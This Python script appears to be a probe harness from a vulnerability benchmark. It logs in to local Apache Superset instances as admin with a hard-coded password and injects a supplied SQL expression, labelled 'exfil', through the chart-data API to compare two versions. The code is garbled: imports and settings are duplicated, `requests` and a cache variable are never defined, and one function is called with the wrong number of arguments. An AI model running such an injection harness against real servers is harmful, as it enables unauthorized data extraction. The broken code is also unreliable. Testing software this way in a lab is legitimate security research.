#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:38400",
    "v1": "http://127.0.0.1:38410",
}
import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from urllib.parse import urljoin
BASE = {
    "v0": "http://127.0.0.1:38400",
    "v1": "http://127.0.0.1:38410",
}
def run_probe(candidate_data, *, version="v1") -> dict:
    
    base = BASE[version]
    setup = _setup_version(version)
    token = setup["token"]
    ds_id = setup["ds_id"]

    payload = candidate_data["payload"]
    resp = requests.post(
        urljoin(base, "/api/v1/chart/data"),
        headers=_headers(token),
        json={
            "datasource": {"id": ds_id, "type": "table"},
            "force": False,
            "queries": [{
                "columns": [{
                    "sqlExpression": payload,
                    "label": "exfil",
                    "expressionType": "SQL",
                    "hasCustomLabel": True,
                }],
                "metrics": [],
                "filters": [],
                "row_limit": 1,
                "order_desc": True,
            }],
            "result_format": "json",
            "result_type": "results",
        },
        timeout=60,
    )
    return {
        "version": version,
        "probe_id": candidate_data.get("probe_id", "unknown"),
        "status": resp.status_code,
        "body": resp.text,
    }
def _setup_version(version: str) -> dict:
    if version in _setup_cache:
        return _setup_cache[version]
    base = BASE[version]
    token = _login(base)
    db_id = _ensure_database(base, token)
    ds_id = _ensure_dataset(base, token, db_id)
    result = {"token": token, "db_id": db_id, "ds_id": ds_id}
    _setup_cache[version] = result
    return result
def _headers(token: str) -> dict:
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
def _ensure_dataset(base: str, token: str, db_id: int) -> int:
    hdrs = _headers(token)
    resp = requests.get(urljoin(base, "/api/v1/dataset/"), headers=hdrs,
                        params={"q": json.dumps({"filters": [{"col": "table_name",
                                "opr": "eq", "value": "public_data"}]})}, timeout=30)
    if resp.ok and resp.json().get("result"):
        return resp.json()["result"][0]["id"]
    resp = requests.post(urljoin(base, "/api/v1/dataset/"), headers=hdrs,
                         json={"database": db_id, "table_name": "public_data",
                               "schema": "public"}, timeout=30)
    resp.raise_for_status()
    return resp.json()["id"]
def _login(base: str) -> str:
    resp = requests.post(
        urljoin(base, "/api/v1/security/login"),
        json={"username": "admin", "password": "admin123",
              "provider": "db", "refresh": True},
        timeout=30,
    )
    resp.raise_for_status()
    return resp.json()["access_token"]
def _ensure_database(base: str, token: str) -> int:
    hdrs = _headers(token)
    resp = requests.get(urljoin(base, "/api/v1/database/"), headers=hdrs,
                        params={"q": json.dumps({"filters": [{"col": "database_name",
                                "opr": "eq", "value": "pcb_postgres"}]})}, timeout=30)
    if resp.ok and resp.json().get("result"):
        return resp.json()["result"][0]["id"]
    resp = requests.post(urljoin(base, "/api/v1/database/"), headers=hdrs,
                         json={"database_name": "pcb_postgres",
                               "sqlalchemy_uri": "postgresql+psycopg2://superset:superset@db:5432/superset_data",
                               "expose_in_sqllab": True, "allow_dml": False}, timeout=30)
    resp.raise_for_status()
    return resp.json()["id"]


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))